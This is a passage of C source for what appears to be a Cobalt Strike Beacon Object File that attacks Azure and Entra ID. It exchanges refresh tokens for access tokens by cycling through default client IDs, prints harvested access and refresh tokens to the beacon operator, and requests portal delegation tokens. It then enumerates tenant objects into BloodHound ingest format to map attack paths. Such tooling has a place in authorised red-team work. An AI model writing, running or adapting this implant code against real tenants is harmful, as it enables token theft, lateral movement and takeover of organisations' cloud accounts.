        BeaconOutput(CALLBACK_OUTPUT, resp, (int)MSVCRT$strlen(resp));
        BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
    }

    HFree(resp);
    if (atBuf) HFree(atBuf);
    if (rtBuf) HFree(rtBuf);
    if (nonceBuf) HFree(nonceBuf);
}

/* ================================================================
 * BarkTokenPostTry
 *
 * Like BarkTokenPost, but returns 1 if an access_token was obtained,
 * 0 otherwise. When quiet==1, failure output is suppressed (used for
 * multi-clientId fallback loops where failures are expected).
 * On success, always prints the token regardless of quiet.
 * ================================================================ */
static int BarkTokenPostTry(LPCWSTR widePath, const char *formBody, int quiet) {
    LPCWSTR hdrWide = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD   bodyLen = formBody ? (DWORD)MSVCRT$strlen(formBody) : 0;
    DWORD   status  = 0;
    char   *atBuf   = NULL;
    char   *rtBuf   = NULL;
    int     ok      = 0;

    char *resp = HttpRequest(
        L"POST", L"login.microsoftonline.com", widePath,
        hdrWide, formBody, bodyLen, &status);

    if (!resp) {
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR,
                "[-] BarkTokenPostTry: request failed (HTTP %lu)\n", status);
        return 0;
    }

    atBuf = (char *)HAlloc(8192);
    rtBuf = (char *)HAlloc(4096);

    if (atBuf && ExtractJsonStr(resp, "access_token", atBuf, 8192)) {
        int atLen = (int)MSVCRT$strlen(atBuf);
        int outLen = 18 + atLen + 1;
        char *outBuf = (char *)HAlloc(outLen + 1);
        if (outBuf) {
            MSVCRT$memcpy(outBuf, "[+] access_token: ", 18);
            MSVCRT$memcpy(outBuf + 18, atBuf, atLen);
            outBuf[18 + atLen] = '\n';
            BeaconOutput(CALLBACK_OUTPUT, outBuf, outLen);
            HFree(outBuf);
        }
        if (rtBuf && ExtractJsonStr(resp, "refresh_token", rtBuf, 4096)) {
            int rtLen = (int)MSVCRT$strlen(rtBuf);
            int rtOutLen = 19 + rtLen + 1;
            char *rtOutBuf = (char *)HAlloc(rtOutLen + 1);
            if (rtOutBuf) {
                MSVCRT$memcpy(rtOutBuf, "[+] refresh_token: ", 19);
                MSVCRT$memcpy(rtOutBuf + 19, rtBuf, rtLen);
                rtOutBuf[19 + rtLen] = '\n';
                BeaconOutput(CALLBACK_OUTPUT, rtOutBuf, rtOutLen);
                HFree(rtOutBuf);
            }
        }
        ok = 1;
    } else if (!quiet) {
        BeaconOutput(CALLBACK_OUTPUT, resp, (int)MSVCRT$strlen(resp));
        BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
    }

    HFree(resp);
    if (atBuf) HFree(atBuf);
    if (rtBuf) HFree(rtBuf);
    return ok;
}

/* ================================================================
 * BarkExchangeRT
 *
 * Exchange a refresh token for an access token (v1 endpoint).
 * Tries BARK_DEFAULT_CLIENT_IDS in order until one succeeds.
 * Returns a heap-allocated access_token string, or NULL on failure.
 * Caller must HFree the result.
 *
 * Does NOT print the token to beacon output — use this when you need
 * the token value in C code rather than sending it to the operator.
 * ================================================================ */
static char *BarkExchangeRT(const char *tenantId, const char *resource,
                             const char *refreshToken) {
    char pathBuf[512];
    char bodyBuf[8192];
    char encRT[4096];
    char *atBuf = NULL;

    UrlEncode(refreshToken, encRT, sizeof(encRT));
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/token", tenantId);
    LPWSTR widePath = MbsToWcs(pathBuf);
    if (!widePath) return NULL;

    LPCWSTR hdrWide = L"Content-Type: application/x-www-form-urlencoded\r\n";
    atBuf = (char *)HAlloc(8192);
    if (!atBuf) { HFree(widePath); return NULL; }

    int i;
    for (i = 0; i < BARK_DEFAULT_CLIENT_ID_COUNT; i++) {
        int clientIndex = BarkClientIndexForResource(resource, i);
        MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
            "grant_type=refresh_token&client_id=%s&refresh_token=%s&resource=%s",
            BARK_DEFAULT_CLIENT_IDS[clientIndex], encRT, resource);
        DWORD status = 0;
        char *resp = HttpRequest(L"POST", L"login.microsoftonline.com",
            widePath, hdrWide, bodyBuf, (DWORD)MSVCRT$strlen(bodyBuf), &status);
        if (!resp) continue;
        if (ExtractJsonStr(resp, "access_token", atBuf, 8192)) {
            HFree(resp);
            HFree(widePath);
            return atBuf;
        }
        HFree(resp);
    }

    HFree(atBuf);
    HFree(widePath);
    return NULL;
}

/* ================================================================
 * BarkPortalPost
 *
 * POST a JSON body to portal.azure.com (DelegationToken endpoint).
 *
 * Parameters:
 *   widePath - wide URL path
 *   jsonBody - narrow JSON body
 * ================================================================ */
static void BarkPortalPost(LPCWSTR widePath, const char *jsonBody) {
    LPCWSTR hdrWide = L"Content-Type: application/json\r\n";
    DWORD   bodyLen = jsonBody ? (DWORD)MSVCRT$strlen(jsonBody) : 0;
    DWORD   status  = 0;

    char *resp = HttpRequest(
        L"POST", L"portal.azure.com", widePath,
        hdrWide, jsonBody, bodyLen, &status);

    if (resp) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp);
        HFree(resp);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkPortalPost: request failed (HTTP %lu)\n", status);
    }
}

/* ================================================================
 * UrlEncode
 *
 * Simple percent-encode of special characters for form body values.
 * dest must be at least (MSVCRT$strlen(src) * 3 + 1) bytes large.
 * ================================================================ */
static void UrlEncode(const char *src, char *dest, size_t destSize) {
    static const char hex[] = "0123456789ABCDEF";
    size_t di = 0;
    if (!dest || destSize == 0) return;
    dest[0] = '\0';
    if (!src) return;                /* tolerate NULL input safely */
    for (size_t i = 0; src[i] && di + 4 < destSize; i++) {
        unsigned char c = (unsigned char)src[i];
        /* Allow alphanumerics and - _ . ~ */
        if ((c >= 'A' && c <= 'Z') ||
            (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            dest[di++] = (char)c;
        } else {
            dest[di++] = '%';
            dest[di++] = hex[(c >> 4) & 0xF];
            dest[di++] = hex[c & 0xF];
        }
    }
    dest[di] = '\0';
}

/* ================================================================
 * BloodHound output helpers
 *
 * Wrap Microsoft Graph / Azure RM responses in the JSON envelope that
 * BloodHound's File Ingest expects:
 *
 *     { "data": [ {"kind": "AZ<Kind>", "data": ... }, ... ],
 *       "meta": { "type": "azure", "version": 5, "count": N } }
 *
 * Handles both flavours:
 *   - Single-object responses (e.g. .../organization, tenant info)
 *     -> emitted as a one-element data array.
 *   - Array responses with `"value":[...]` (the common Graph listing
 *     shape) -> each element wrapped with the supplied kind.
 *
 * Pagination via `@odata.nextLink` is followed automatically.
 * ================================================================ */

/* Skip a JSON string literal starting at *p (which must be '"').
 * Returns pointer just past the closing quote, or NULL on malformed input. */
static const char *JsonSkipString(const char *p, const char *end) {
    if (!p || p >= end || *p != '"') return NULL;
    p++;
    while (p < end) {
        if (*p == '\\') {
            p += 2;
            continue;
        }
        if (*p == '"') return p + 1;
        p++;
    }
    return NULL;
}

/* Skip a balanced {...} or [...] starting at *p (which must be `{` or `[`).
 * Returns pointer just past the closing brace/bracket, or NULL. */
static const char *JsonSkipBalanced(const char *p, const char *end) {
    if (!p || p >= end) return NULL;
    char open  = *p;
    char close;
    if      (open == '{') close = '}';
    else if (open == '[') close = ']';
    else return NULL;
    int depth = 0;
    while (p < end) {
        char c = *p;
        if (c == '"') {
            const char *q = JsonSkipString(p, end);
            if (!q) return NULL;
            p = q;
            continue;
        }
        if      (c == open)  depth++;
        else if (c == close) {
            depth--;
            if (depth == 0) return p + 1;
        }
        p++;
    }
    return NULL;
}

/* Find `needle` inside [start, end), but skip over JSON strings so a
 * match inside quoted text doesn't false-positive. */
static const char *JsonFindKey(const char *start, const char *end, const char *needle) {
    if (!start || !end || !needle) return NULL;
    size_t nlen = MSVCRT$strlen(needle);
    if (nlen == 0 || (size_t)(end - start) < nlen) return NULL;
    const char *p = start;
    while (p + nlen <= end) {
        /* Check for a match BEFORE skipping strings.  This is critical
         * when the needle itself is a quoted key like `"value"` or
         * `"@odata.nextLink"` — the old code would skip the key's
         * opening quote and never match. */
        if (MSVCRT$strncmp(p, needle, nlen) == 0)
            return p;
        if (*p == '"') {
            /* Not a match — skip this quoted string so we don't
             * false-positive on text *inside* a JSON string value. */
            const char *q = JsonSkipString(p, end);
            if (!q) return NULL;
            p = q;
            continue;
        }
        p++;
    }
    return NULL;
}

/* Extract the URL value associated with the first occurrence of
 * `"@odata.nextLink":"<url>"` in [start, end). Returns a heap-allocated
 * copy (caller must HFree), or NULL if not found. */
static char *JsonExtractNextLink(const char *start, const char *end) {
    const char *k = JsonFindKey(start, end, "\"@odata.nextLink\"");
    if (!k) k = JsonFindKey(start, end, "\"odata.nextLink\"");
    if (!k) k = JsonFindKey(start, end, "\"nextLink\"");
    if (!k) return NULL;
    /* Skip key and colon. */
    k = JsonFindKey(k, end, ":");
    if (!k) return NULL;
    k++;
    while (k < end && (*k == ' ' || *k == '\t' || *k == '\n' || *k == '\r')) k++;
    if (k >= end || *k != '"') return NULL;
    const char *q = JsonSkipString(k, end);
    if (!q) return NULL;
    /* [k+1 .. q-2) is the URL body without the surrounding quotes,
     * but we still need to un-escape \/ -> / which Graph emits. */
    size_t inLen = (size_t)((q - 1) - (k + 1));
    char *url = (char *)HAlloc(inLen + 1);
    if (!url) return NULL;
    size_t oi = 0;
    for (size_t i = 0; i < inLen; i++) {
        char c = k[1 + i];
        if (c == '\\' && i + 1 < inLen && k[2 + i] == '/') {
            url[oi++] = '/';
            i++;
        } else if (c == '\\' && i + 1 < inLen) {
            /* preserve other escapes verbatim */
            url[oi++] = c;
            url[oi++] = k[2 + i];
            i++;
        } else {
            url[oi++] = c;
        }
    }
    url[oi] = '\0';
    return url;
}

/* Legacy AAD Graph odata.nextLink omits api-version.  If the host is
 * graph.windows.net and the path lacks api-version, return a new
 * heap-allocated path with &api-version=1.6 appended.  Returns NULL
 * (no fix needed) otherwise.  Caller must HFree if non-NULL. */
/* Resolve an odata.nextLink URL into a request path (wide) for WinHTTP.
 *
 * Handles absolute URLs (strips scheme+host) and relative URLs (prepends
 * tenantBase).  For legacy AAD Graph (graph.windows.net), also ensures
 * api-version=1.6 is present — the legacy API requires it but omits it
 * from its nextLink values.
 *
 * nextUrl      — raw odata.nextLink value (narrow)
 * host         — target host (wide), e.g. L"graph.windows.net"
 * tenantBase   — narrow tenant base path, e.g. "/2590ccef-.../"; used to
 *                resolve relative nextLinks on legacy graph.  May be NULL.
 *
 * Returns heap-allocated LPWSTR or NULL on alloc failure. Caller must HFree. */
static LPWSTR BarkResolveNextLink(const char *nextUrl,
                                   LPCWSTR host,
                                   const char *tenantBase) {
    const char *np = nextUrl;
    int isAbsolute = 0;
    if (MSVCRT$strncmp(np, "https://", 8) == 0)     { np += 8; isAbsolute = 1; }
    else if (MSVCRT$strncmp(np, "http://", 7) == 0)  { np += 7; isAbsolute = 1; }

    int isLegacy = (host[0]==L'g' && host[5]==L'.' && host[6]==L'w');

    SIZE_T needed = MSVCRT$strlen(nextUrl) +
                    (tenantBase ? MSVCRT$strlen(tenantBase) : 0) + 32;
    char *pathBuf = (char *)HAlloc(needed);
    if (!pathBuf) return NULL;

    if (isAbsolute) {
        const char *slash = MSVCRT$strstr((char *)np, "/");
        const char *path = slash ? slash : nextUrl;
        MSVCRT$strncpy(pathBuf, path, needed - 1);
        pathBuf[needed - 1] = '\0';
    } else if (isLegacy && tenantBase && MSVCRT$strlen(tenantBase) > 0) {
        MSVCRT$sprintf_s(pathBuf, needed, "%s%s", tenantBase, nextUrl);
    } else {
        MSVCRT$sprintf_s(pathBuf, needed, "/%s", nextUrl);
    }

    if (isLegacy && !MSVCRT$strstr(pathBuf, "api-version")) {
        SIZE_T len = MSVCRT$strlen(pathBuf);
        if (len + 20 < needed)
            MSVCRT$sprintf_s(pathBuf + len, needed - len,
                "%capi-version=1.6",
                MSVCRT$strstr(pathBuf, "?") ? '&' : '?');
    }

    LPWSTR result = MbsToWcs(pathBuf);
    HFree(pathBuf);
    return result;
}

/* Print BH item wrapper around the byte range [item, itemEnd). */
static void BarkPrintBHItem(const char *kind, const char *item,
                            const char *itemEnd, int isFirst) {
    char prefix[256];
    if (isFirst)
        MSVCRT$sprintf_s(prefix, sizeof(prefix),
                         "{\"kind\":\"%s\",\"data\":", kind);
    else
        MSVCRT$sprintf_s(prefix, sizeof(prefix),
                         ",{\"kind\":\"%s\",\"data\":", kind);
    BeaconOutput(CALLBACK_OUTPUT, prefix, (int)MSVCRT$strlen(prefix));
    BeaconOutput(CALLBACK_OUTPUT, item, (int)(itemEnd - item));
    BeaconOutput(CALLBACK_OUTPUT, "}", 1);
}

/* Iterate over each {...} item in a `"value":[...]` array body and emit
 * BH item wrappers. Returns number of items emitted. */
static int BarkEmitBHArrayBody(const char *body, const char *bodyEnd,
                               const char *kind, int alreadyEmitted) {
    int count = 0;
    const char *p = body;
    while (p < bodyEnd) {
        while (p < bodyEnd &&
               (*p == ' ' || *p == '\n' || *p == '\r' ||
                *p == '\t' || *p == ','))
            p++;
        if (p >= bodyEnd || *p != '{') break;
        const char *itemEnd = JsonSkipBalanced(p, bodyEnd);
        if (!itemEnd) break;
        BarkPrintBHItem(kind, p, itemEnd, (alreadyEmitted + count) == 0);
        count++;
        p = itemEnd;
    }
    return count;
}

/* Worker: perform one authenticated GET, append items to the BH stream.
 * Returns the URL of the next page (heap-allocated, caller HFrees) or NULL.
 * On the first call `*alreadyEmitted` must be 0; subsequent calls update it. */
static char *BarkGetBHPage(LPCWSTR host, LPCWSTR widePath,
                          const char *bearerToken, const char *kind,
                          int *alreadyEmitted, int *gotArrayShape) {
    DWORD  status  = 0;
    char  *resp    = NULL;
    char  *nextUrl = NULL;

    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BarkGetBH: header conversion failed\n");
        return NULL;
    }
    resp = HttpRequestWithRetry(L"GET", host, widePath, hdrWide, NULL, 0, &status);
    HFree(hdrWide);
    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: request failed (HTTP %lu)\n", status);
        return NULL;
    }
    if (status >= 400) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: HTTP %lu error:\n    %s\n", status, resp);
        HFree(resp);
        return NULL;
    }

    size_t respLen = MSVCRT$strlen(resp);
    const char *end = resp + respLen;

    /* Locate `"value":` followed by `[` (Graph collection responses). */
    const char *vKey = JsonFindKey(resp, end, "\"value\"");
    if (vKey) {
        const char *bracket = JsonFindKey(vKey, end, ":");
        if (bracket) {
            bracket++;
            while (bracket < end &&
                   (*bracket == ' ' || *bracket == '\t' ||
                    *bracket == '\n' || *bracket == '\r'))
                bracket++;
            if (bracket < end && *bracket == '[') {
                const char *arrEnd = JsonSkipBalanced(bracket, end);
                if (arrEnd) {
                    *gotArrayShape = 1;
                    int n = BarkEmitBHArrayBody(
                        bracket + 1, arrEnd - 1, kind, *alreadyEmitted);
                    *alreadyEmitted += n;
                    nextUrl = JsonExtractNextLink(resp, end);
                }
            }
        }
    }

    if (!*gotArrayShape) {
        /* Single-object response. Wrap whole body once. */
        BarkPrintBHItem(kind, resp, end, *alreadyEmitted == 0);
        *alreadyEmitted += 1;
    }

    HFree(resp);
    return nextUrl;
}

/* Growing in-memory buffer for accumulating the BH envelope before
 * we know its final size and before we write it to disk. */
typedef struct {
    char  *buf;
    SIZE_T cap;
    SIZE_T len;
    int    ok;
} BarkBuf;

static void BarkBufAppend(BarkBuf *b, const char *data, SIZE_T len) {
    if (!b->ok) return;
    if (b->len + len + 1 > b->cap) {
        SIZE_T newCap = (b->cap == 0) ? 65536 : (b->cap * 2);
        while (newCap < b->len + len + 1) newCap *= 2;
        char *nb = (char *)HAlloc(newCap);
        if (!nb) { b->ok = 0; return; }
        if (b->buf) {
            MSVCRT$memcpy(nb, b->buf, b->len);
            HFree(b->buf);
        }
        b->buf = nb;
        b->cap = newCap;
    }
    MSVCRT$memcpy(b->buf + b->len, data, len);
    b->len += len;
    b->buf[b->len] = '\0';
}

static void BarkBufAppendAsciiUpper(BarkBuf *b, const char *data, SIZE_T len) {
    SIZE_T offset = 0;
    char chunk[128];
    if (!b || !data) return;
    while (offset < len) {
        SIZE_T chunkLen = len - offset;
        SIZE_T i;
        if (chunkLen > sizeof(chunk)) chunkLen = sizeof(chunk);
        for (i = 0; i < chunkLen; i++) {
            char c = data[offset + i];
            if (c >= 'a' && c <= 'z') c = (char)(c - ('a' - 'A'));
            chunk[i] = c;
        }
        BarkBufAppend(b, chunk, chunkLen);
        offset += chunkLen;
    }
}

static void BarkBufFree(BarkBuf *b) {
    if (b->buf) HFree(b->buf);
    b->buf = NULL;
    b->cap = b->len = 0;
}

/* Append a JSON object while replacing exact quoted property names.  Graph's
 * beta servicePrincipal and device schemas use names that differ from the
 * AzureHound v3 ingest model even though the values are equivalent. */
static void BarkBufAppendRenamedJsonKey(BarkBuf *out,
                                        const char *item,
                                        const char *itemEnd,
                                        const char *oldKey,
                                        const char *newKey) {
    const char *cursor = item;
    const char *found;
    size_t oldLen = MSVCRT$strlen(oldKey);
    while (cursor < itemEnd) {
        found = MSVCRT$strstr(cursor, oldKey);
        if (!found || found >= itemEnd || found + oldLen > itemEnd) break;
        BarkBufAppend(out, cursor, (SIZE_T)(found - cursor));
        BarkBufAppend(out, newKey, MSVCRT$strlen(newKey));
        cursor = found + oldLen;
    }
    if (cursor < itemEnd)
        BarkBufAppend(out, cursor, (SIZE_T)(itemEnd - cursor));
}

/* AzureHound normalizes Entra object IDs to uppercase before serializing
 * them.  RoleGraph endpoints use that normalized form as well, so preserving
 * Graph's lowercase GUIDs here creates a second, name-less node in
 * BloodHound.  Uppercase only ASCII bytes inside the selected JSON string;
 * escaped bytes and UTF-8 text are copied verbatim. */
static int BarkBufAppendUppercaseJsonStringField(BarkBuf *out,
                                                  const char *item,
                                                  const char *itemEnd,
                                                  const char *key) {
    const char *keyPos;
    const char *colon;
    const char *valueStart;
    const char *valueEnd;
    const char *p;

    if (!out || !item || !itemEnd || !key) return 0;
    keyPos = JsonFindKey(item, itemEnd, key);
    if (!keyPos) return 0;
    colon = JsonFindKey(keyPos + MSVCRT$strlen(key), itemEnd, ":");
    if (!colon) return 0;
    valueStart = colon + 1;
    while (valueStart < itemEnd &&
           (*valueStart == ' ' || *valueStart == '\t' ||
            *valueStart == '\n' || *valueStart == '\r'))
        valueStart++;
    if (valueStart >= itemEnd || *valueStart != '"') return 0;
    valueEnd = JsonSkipString(valueStart, itemEnd);
    if (!valueEnd) return 0;

    BarkBufAppend(out, item, (SIZE_T)(valueStart + 1 - item));
    p = valueStart + 1;
    while (p < valueEnd - 1) {
        char c = *p;
        if (c == '\\') {
            SIZE_T escapedLen = 1;
            if (p + 1 < valueEnd - 1) {
                escapedLen = 2;
                if (*(p + 1) == 'u' && p + 6 < valueEnd)
                    escapedLen = 6;
            }
            BarkBufAppend(out, p, escapedLen);
            p += escapedLen;
            continue;
        }
        if (c >= 'a' && c <= 'z') c = (char)(c - ('a' - 'A'));
        BarkBufAppend(out, &c, 1);
        p++;
    }
    BarkBufAppend(out, valueEnd - 1, (SIZE_T)(itemEnd - (valueEnd - 1)));
    return out->ok;
}

/* Uppercase every string value whose exact JSON property name is in keys.
 * This is used for relationship payloads where multiple identity fields must
 * use the same casing as their corresponding Azure nodes when BloodHound's
 * use_raw_object_id feature is enabled. */
static int BarkBufAppendUppercaseJsonStringFields(BarkBuf *out,
                                                   const char *item,
                                                   const char *itemEnd,
                                                   const char **keys,
                                                   int keyCount) {
    const char *cursor = item;
    const char *search = item;
    int changed = 0;

    if (!out || !item || !itemEnd || !keys || keyCount <= 0) return 0;
    while (search < itemEnd) {
        const char *found = NULL;
        const char *matchedKey = NULL;
        const char *colon;
        const char *valueStart;
        const char *valueEnd;
        const char *p;
        int i;

        for (i = 0; i < keyCount; i++) {
            const char *candidate = JsonFindKey(search, itemEnd, keys[i]);
            if (candidate && (!found || candidate < found)) {
                found = candidate;
                matchedKey = keys[i];
            }
        }
        if (!found || !matchedKey) break;
        colon = JsonFindKey(found + MSVCRT$strlen(matchedKey), itemEnd, ":");
        if (!colon) break;
        valueStart = colon + 1;
        while (valueStart < itemEnd &&
               (*valueStart == ' ' || *valueStart == '\t' ||
                *valueStart == '\n' || *valueStart == '\r'))
            valueStart++;
        if (valueStart >= itemEnd || *valueStart != '"') {
            search = found + MSVCRT$strlen(matchedKey);
            continue;
        }
        valueEnd = JsonSkipString(valueStart, itemEnd);
        if (!valueEnd) break;

        BarkBufAppend(out, cursor, (SIZE_T)(valueStart + 1 - cursor));
        p = valueStart + 1;
        while (p < valueEnd - 1) {
            char c = *p;
            if (c == '\\') {
                SIZE_T escapedLen = 1;
                if (p + 1 < valueEnd - 1) {
                    escapedLen = 2;
                    if (*(p + 1) == 'u' && p + 6 < valueEnd)
                        escapedLen = 6;
                }
                BarkBufAppend(out, p, escapedLen);
                p += escapedLen;
                continue;
            }
            if (c >= 'a' && c <= 'z') c = (char)(c - ('a' - 'A'));
            BarkBufAppend(out, &c, 1);
            p++;
        }
        BarkBufAppend(out, valueEnd - 1, 1);
        cursor = valueEnd;
        search = valueEnd;
        changed = 1;
    }
    if (!changed) return 0;
    if (cursor < itemEnd)
        BarkBufAppend(out, cursor, (SIZE_T)(itemEnd - cursor));
    return out->ok;
}

static int BarkBHKindUsesNormalizedObjectId(const char *kind) {
    if (!kind) return 0;
    return MSVCRT$strcmp(kind, "AZTenant") == 0 ||
           MSVCRT$strcmp(kind, "AZUser") == 0 ||
           MSVCRT$strcmp(kind, "AZGroup") == 0 ||
           MSVCRT$strcmp(kind, "AZDevice") == 0 ||
           MSVCRT$strcmp(kind, "AZRole") == 0 ||
           MSVCRT$strcmp(kind, "AZApp") == 0 ||
           MSVCRT$strcmp(kind, "AZServicePrincipal") == 0 ||
           MSVCRT$strcmp(kind, "AZFederatedIdentityCredential") == 0 ||
           MSVCRT$strcmp(kind, "AZSubscription") == 0 ||
           MSVCRT$strcmp(kind, "AZManagementGroup") == 0 ||
           MSVCRT$strcmp(kind, "AZResourceGroup") == 0 ||
           MSVCRT$strcmp(kind, "AZResource") == 0 ||
           MSVCRT$strcmp(kind, "AZRoleDefinition") == 0 ||
           MSVCRT$strcmp(kind, "AZVM") == 0 ||
           MSVCRT$strcmp(kind, "AZVMScaleSet") == 0 ||
           MSVCRT$strcmp(kind, "AZManagedCluster") == 0 ||
           MSVCRT$strcmp(kind, "AZKeyVault") == 0 ||
           MSVCRT$strcmp(kind, "AZStorageAccount") == 0 ||
           MSVCRT$strcmp(kind, "AZAutomationAccount") == 0 ||
           MSVCRT$strcmp(kind, "AZLogicApp") == 0 ||
           MSVCRT$strcmp(kind, "AZFunctionApp") == 0 ||
           MSVCRT$strcmp(kind, "AZWebApp") == 0 ||
           MSVCRT$strcmp(kind, "AZContainerRegistry") == 0 ||
           MSVCRT$strcmp(kind, "AZContainerGroup") == 0 ||
           MSVCRT$strcmp(kind, "AZContainerApp") == 0 ||
           MSVCRT$strcmp(kind, "AZCosmosDB") == 0;
}

static int BarkJsonObjectBoolIsTrue(const char *object,
                                    const char *objectEnd,
                                    const char *key) {
    const char *keyPos = JsonFindKey(object, objectEnd, key);
    const char *colon;
    if (!keyPos) return 0;
    colon = JsonFindKey(keyPos + MSVCRT$strlen(key), objectEnd, ":");
    if (!colon) return 0;
    colon++;
    while (colon < objectEnd &&
           (*colon == ' ' || *colon == '\t' ||
            *colon == '\n' || *colon == '\r')) colon++;
    return colon + 4 <= objectEnd && MSVCRT$strncmp(colon, "true", 4) == 0;
}

/* Organization already returns verifiedDomains.  AzureHound derives domains
 * and defaultDomain from that array, so perform the same output-time
 * conversion and only request countryLetterCode as an additional scalar. */
static void BarkBufAppendTenantCompatibility(BarkBuf *out,
                                             const char *item,
                                             const char *itemEnd) {
    char *countryCode = NULL;
    char *defaultDomain = NULL;
    const char *domainsKey;
    const char *domainsColon;
    const char *domainsEnd = NULL;
    int domainCount = 0;

    if (itemEnd <= item || *(itemEnd - 1) != '}') {
        BarkBufAppend(out, item, (SIZE_T)(itemEnd - item));
        return;
    }

    BarkBufAppend(out, item, (SIZE_T)(itemEnd - item - 1));
    countryCode = JsonExtractStringValue(
        item, itemEnd, "\"countryLetterCode\"");
    if (countryCode) {
        BarkBufAppend(out, ",\"countryCode\":\"", 16);
        BarkBufAppend(out, countryCode, MSVCRT$strlen(countryCode));
        BarkBufAppend(out, "\"", 1);
    }

    domainsKey = JsonFindKey(item, itemEnd, "\"verifiedDomains\"");
    domainsColon = domainsKey ? JsonFindKey(domainsKey, itemEnd, ":") : NULL;
    if (domainsColon) {
        domainsColon++;
        while (domainsColon < itemEnd &&
               (*domainsColon == ' ' || *domainsColon == '\t' ||
                *domainsColon == '\n' || *domainsColon == '\r'))
            domainsColon++;
        if (domainsColon < itemEnd && *domainsColon == '[')
            domainsEnd = JsonSkipBalanced(domainsColon, itemEnd);
    }

    if (domainsEnd) {
        const char *p = domainsColon + 1;
        BarkBufAppend(out, ",\"domains\":[", 12);
        while (p < domainsEnd - 1) {
            const char *domainEnd;
            char *name;
            while (p < domainsEnd - 1 && *p != '{') p++;
            if (p >= domainsEnd - 1) break;
            domainEnd = JsonSkipBalanced(p, domainsEnd);
            if (!domainEnd) break;
            name = JsonExtractStringValue(p, domainEnd, "\"name\"");
            if (name && name[0]) {
                if (domainCount > 0) BarkBufAppend(out, ",", 1);
                BarkBufAppend(out, "\"", 1);
                BarkBufAppend(out, name, MSVCRT$strlen(name));
                BarkBufAppend(out, "\"", 1);
                domainCount++;
                if (!defaultDomain && BarkJsonObjectBoolIsTrue(
                        p, domainEnd, "\"isDefault\"")) {
                    defaultDomain = name;
                    name = NULL;
                }
            }
            if (name) HFree(name);
            p = domainEnd;
        }
        BarkBufAppend(out, "]", 1);
    }

    if (defaultDomain) {
        BarkBufAppend(out, ",\"defaultDomain\":\"", 18);
        BarkBufAppend(out, defaultDomain, MSVCRT$strlen(defaultDomain));
        BarkBufAppend(out, "\"", 1);
    }
    BarkBufAppend(out, "}", 1);
    if (countryCode) HFree(countryCode);
    if (defaultDomain) HFree(defaultDomain);
}

/* Return non-zero when a compatibility object was built in out. */
static int BarkBuildBHCompatibleItem(const char *kind,
                                     const char *item,
                                     const char *itemEnd,
                                     BarkBuf *out) {
    BarkBuf shaped = { NULL, 0, 0, 1 };
    BarkBuf idNormalized = { NULL, 0, 0, 1 };
    const char *source = item;
    const char *sourceEnd = itemEnd;
    const char **normalizationKeys = NULL;
    int normalizationKeyCount = 0;
    int hasShapeCompatibility = 0;
    int hasIdNormalization = 0;
    int hasFieldNormalization = 0;

    static const char *tenantKeys[] = {
        "\"tenantId\"", "\"displayName\""
    };
    static const char *userGroupKeys[] = {
        "\"tenantId\"", "\"onPremisesSecurityIdentifier\"",
        "\"displayName\"", "\"tenantName\""
    };
    static const char *deviceKeys[] = {
        "\"deviceId\"", "\"displayName\"", "\"tenantId\"",
        "\"tenantName\""
    };
    static const char *roleKeys[] = {
        "\"displayName\"", "\"tenantId\"", "\"tenantName\""
    };
    static const char *appKeys[] = {
        "\"appId\"", "\"displayName\"", "\"tenantId\"",
        "\"tenantName\""
    };
    static const char *servicePrincipalKeys[] = {
        "\"appId\"", "\"appOwnerOrganizationId\"", "\"displayName\"",
        "\"tenantId\"", "\"tenantName\""
    };
    static const char *federatedCredentialKeys[] = {
        "\"appId\"", "\"tenantId\"", "\"tenantName\""
    };
    static const char *appRoleAssignmentKeys[] = {
        "\"principalId\"", "\"resourceId\"", "\"tenantId\""
    };
    static const char *subscriptionKeys[] = {
        "\"subscriptionId\"", "\"displayName\"", "\"tenantId\""
    };
    static const char *armKeys[] = {
        "\"subscriptionId\"", "\"resourceGroupId\"",
        "\"resourceGroupName\"", "\"tenantId\"", "\"principalId\"",
        "\"managementGroupId\"", "\"nodeResourceGroup\""
    };

    if (!kind) return 0;
    if (MSVCRT$strcmp(kind, "AZTenant") == 0) {
        BarkBufAppendTenantCompatibility(&shaped, item, itemEnd);
        hasShapeCompatibility = shaped.ok && shaped.buf;
    } else if (MSVCRT$strcmp(kind, "AZServicePrincipal") == 0 &&
               JsonFindKey(item, itemEnd, "\"publishedPermissionScopes\"")) {
        BarkBufAppendRenamedJsonKey(&shaped, item, itemEnd,
            "\"publishedPermissionScopes\"", "\"oauth2PermissionScopes\"");
        hasShapeCompatibility = shaped.ok && shaped.buf;
    } else if (MSVCRT$strcmp(kind, "AZDevice") == 0 &&
               JsonFindKey(item, itemEnd, "\"extensionAttributes\"")) {
        BarkBufAppendRenamedJsonKey(&shaped, item, itemEnd,
            "\"extensionAttributes\"", "\"onPremisesExtensionAttributes\"");
        hasShapeCompatibility = shaped.ok && shaped.buf;
    }

    if (hasShapeCompatibility) {
        source = shaped.buf;
        sourceEnd = shaped.buf + shaped.len;
    }

    if (BarkBHKindUsesNormalizedObjectId(kind)) {
        hasIdNormalization = BarkBufAppendUppercaseJsonStringField(
            &idNormalized, source, sourceEnd, "\"id\"");
        if (!hasIdNormalization) {
            /* Legacy Azure AD Graph calls expose objectId; the caller later
             * renames this key to id, so normalize its value first. */
            hasIdNormalization = BarkBufAppendUppercaseJsonStringField(
                &idNormalized, source, sourceEnd, "\"objectId\"");
        }
        if (hasIdNormalization) {
            source = idNormalized.buf;
            sourceEnd = idNormalized.buf + idNormalized.len;
        }
    }

    if (MSVCRT$strcmp(kind, "AZTenant") == 0) {
        normalizationKeys = tenantKeys;
        normalizationKeyCount = (int)(sizeof(tenantKeys) /
            sizeof(tenantKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZUser") == 0 ||
